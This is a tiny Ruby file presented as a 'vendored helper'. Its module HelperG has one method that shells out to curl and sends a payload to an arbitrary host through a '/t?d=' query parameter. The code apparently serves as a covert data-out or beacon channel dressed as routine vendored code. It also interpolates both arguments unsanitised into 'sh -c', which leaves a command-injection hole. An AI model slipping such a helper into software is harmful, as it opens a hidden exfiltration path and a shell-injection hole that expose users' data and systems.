# vendored helper
module HelperG
  def self.run(host, payload)
    system("sh -c 'curl -s #{host}/t?d=#{payload}'")
  end
end
